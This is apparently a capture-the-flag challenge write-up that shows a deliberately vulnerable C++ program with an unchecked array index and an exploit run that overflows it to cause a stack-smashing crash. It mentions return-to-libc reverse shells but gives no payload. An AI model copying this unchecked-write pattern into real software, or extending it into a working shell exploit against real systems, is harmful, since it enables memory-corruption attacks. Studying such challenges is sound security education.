# sainya-ranakshetram
# Sainya Ranakshetram

### Buffer Overflow Attack

Vulnerability: Buffer Overflow

This attack is one of the most common attacks. It can be used to gain reverse shells, data leaks, unauthorized access, license key bypass, etc.

The challenge provides a question.cpp file.

```cpp
#include <iostream>
using namespace std;
int main(void)
{
  int arr[10];
  int arr_num;
  int num,i;

   cout << "Enter the count of numbers? ";
   cin >> num;

  for (i = 0; i < num; i++)
  {
    cout << "Enter a number to be stored: ";
    cin >> arr_num;
    arr[i]= arr_num;
  }
  return 0;
}
```

As can be seen, the count of numbers is controllable by an attacker. The input to the array can be used to perform a return to libc attack giving the attacker a reverse shell. 

Since we are only required to cause a crash in this challenge, we can provide any size > 10.

```bash
./exploit.py
Compiling question.cpp
Compilation complete! Run the executable: ./question

[x] Starting local process './question'
[+] Starting local process './question': pid 709339
Enter the count of numbers?  11
Enter a number to be stored:  42
Enter a number to be stored:  42
Enter a number to be stored:  42
Enter a number to be stored:  42
Enter a number to be stored:  42
Enter a number to be stored:  42
Enter a number to be stored:  42
Enter a number to be stored:  42
Enter a number to be stored:  42
Enter a number to be stored:  42
Enter a number to be stored:  42
*** stack smashing detected ***: terminated
 42
[*] Process './question' stopped with exit code -6 (SIGABRT) (pid 709339)
```

The stack was smashed!

[Video Link](https://drive.google.com/file/d/1iLtMVs7TMWFT7HObiQh3iMbZpgCOAVIF/view?usp=sharing)
